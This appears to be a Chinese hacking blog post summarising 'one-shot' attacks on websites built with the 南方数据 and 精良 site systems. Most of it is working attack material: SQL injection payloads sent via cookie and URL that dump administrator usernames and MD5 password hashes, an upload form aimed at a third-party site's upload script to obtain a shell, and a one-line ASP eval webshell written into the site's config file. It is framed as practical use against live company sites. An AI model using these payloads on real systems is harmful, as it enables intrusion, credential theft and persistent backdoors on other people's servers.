@@ -1,0 +1,118 @@
+南方数据，精良整站系统通杀漏洞总结
+分类： 个人原创 标签: 南方数据 精良 通杀漏洞 评论(1) 浏览(480)  Author: Str1ven 
+最近旁注的时候发现旁站的一些公司站点都是南方数据或者精良的，可以秒杀，此文总结一下。。。。
+
+ 
+
+以下是获得管理权限：
+
+ 
+
+
+选择目标打开某站,打开并记录地址
+
+            
+
+例如:     http://www.hackver.com/shownews.asp?id=95
+
+                  
+
+在浏览器中输入:
+
+                       
+
+ 复制代码
+
+javascript:alert(document.cookie="id="+escape("1 and 1=2 union select 1,username,password,4,5,6,7,8,9,10 from Admin"))
+
+                  
+
+清空浏览器地址栏内容,访问http://www.hackver.com/shownews.asp                        
+
+                  
+
+管理员帐号和密码的MD5加密值就爆出来了。
+
+          
+
+没有防注入情况下：
+
+ 
+
+http://www.hackver.com/NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20''='
+
+ 
+
+以下是获得webshelll方法：
+
+ 
+
+
+改样式上传:http://www.hackver.com/admin/southidceditor/admin_style.asp       asaspp  
+
+ 
+
+===============================================
+
+改包通过明小子上传
+
+ 
+
+=========================================
+
+通过upfile_other.asp漏洞文件直接取SHELL
+
+ 
+
+直接打开userreg.asp进行注册会员，进行登录，（在未退出登录的状态下）使用本地上传文件进行上传代码如下：
+
+ 
+
+<HTML><HEAD> 
+
+<META http-equiv=Content-Type content="text/html; charset=gb2312"> 
+
+<STYLE type=text/css>BODY { 
+
+FONT-SIZE: 9pt; BACKGROUND-COLOR: #e1f4ee 
+
+} 
+
+.tx1 { 
+
+BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: #000000 1px solid; COLOR: #0000ff; BORDER-BOTTOM: #000000 1px solid; HEIGHT: 20px 
+
+} 
+
+</STYLE>
+
+ 
+
+<META content="MSHTML 6.00.2800.1400" name=GENERATOR></HEAD> 
+
+<BODY leftMargin=0 topMargin=0> 
+
+<FORM name=form1 action="http://sdsyris.com/admin/Upload_Pic.asp"; method=post 
+
+encType=multipart/form-data><INPUT class=tx1 type=file size=30 name=FileName> <INPUT class=tx1 type=file size=30 name=FileName1> <INPUT style="BORDER-RIGHT: rgb(88,88,88) 1px double; BORDER-TOP: rgb(88,88,88) 1px double; FONT-WEIGHT: normal; FONT-SIZE: 9pt; BORDER-LEFT: rgb(88,88,88) 1px double; LINE-HEIGHT: normal; BORDER-BOTTOM: rgb(88,88,88) 1px double; FONT-STYLE: normal; FONT-VARIANT: normal" type=submit value=上传 name=Submit> 
+
+<INPUT id=PhotoUrlID type=hidden value=0 name=PhotoUrlID> </FORM></BODY></HTML>
+
+==========================================================
+
+ 
+
+以上代码直接暴管理员帐号和密码，取SHELL方法如下：
+
+ 
+
+在网站配置的版权信息里写入 "%><%eval(request(chr(35)))%><%'
+
+ 
+
+成功把shell写入http://www.hackver.com/inc/config.asp
+
+ 
+
+这里一句话chr(32)密码是“#”
+
